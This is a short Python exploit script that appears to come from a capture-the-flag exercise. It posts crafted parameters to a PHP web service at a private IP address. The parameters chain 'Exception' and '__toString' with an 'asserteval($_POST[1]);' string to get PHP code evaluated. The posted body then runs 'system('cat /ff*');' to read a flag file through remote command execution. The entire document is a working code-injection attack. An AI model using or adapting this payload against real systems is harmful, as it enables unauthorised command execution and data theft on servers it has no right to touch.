import requests

params = {
    "a" : "Exception",
    "b" : "asserteval($_POST[1]);",
    "c" : "__toString",
    "d" : "36",
    "e" : "6",
    "f" : "42",
    "g" : "16"
}

data = {
    "1":"system('cat /ff*');"
}

url = "http://10.10.175.247:33428"

r  = requests.post(url = url,
                   params=params,
                   data=data)

print(r.text)